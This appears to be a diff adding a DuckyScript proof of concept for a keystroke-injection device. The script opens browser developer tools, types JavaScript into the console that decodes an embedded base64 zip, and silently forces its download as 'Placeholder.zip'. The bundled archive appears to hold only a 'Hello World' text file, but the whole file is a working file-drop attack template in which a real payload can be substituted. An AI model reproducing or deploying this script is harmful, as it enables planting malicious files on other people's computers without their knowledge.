@@ -1,0 +1,65 @@
+REM Credit John-Hickens
+REM A small working PoC
+DELAY 400
+CTRL-SHIFT I
+DELAY 1000
+SHIFT TAB 
+DELAY 1000
+TAB
+DELAY 3000
+STRING function Base64toBytes(base64Data){ var binary_vals = atob(base64Data);var binary_len = binary_vals.length;var bytes_data = new Uint8Array(binary_len);for(i = 0; i < binary_len; i++){bytes_data[i] = binary_vals.charCodeAt(i);}return bytes_data.buffer}
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000 
+ENTER
+DELAY 1000
+STRING var filename = "Placeholder.zip";
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+STRING var filedata = "UEsDBBQAAAAAAA2hgVVWsRdKCwAAAAsAAAAPAAAASGVsbG8gV29ybGQudHh0SGVsbG8gV29ybGRQSwECFAAUAAAAAAANoYFVVr";
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+STRING filedata = filedata +"EXSgsAAAALAAAADwAAAAAAAAABACAAAAAAAAAASGVsbG8gV29ybGQudHh0UEsFBgAAAAABAAEAPQAAADgAAAAAAA==";
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 3000
+STRING var file_bytes = Base64toBytes(filedata);
+DELAY 500
+STRING var blob = new Blob([file_bytes], {"type":"octet/stream"});
+DELAY 500
+STRING var anchor = document.createElement("a");
+DELAY 500
+STRING document.body.append(anchor);
+DELAY 500
+STRING var url = window.URL.createObjectURL(blob);
+DELAY 500
+STRING anchor.href = url;
+DELAY 500
+STRING anchor.download = filename;
+DELAY 500
+STRING anchor.click();
+DELAY 500
+STRING window.URL.revokeObjectURL(url);
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 2000
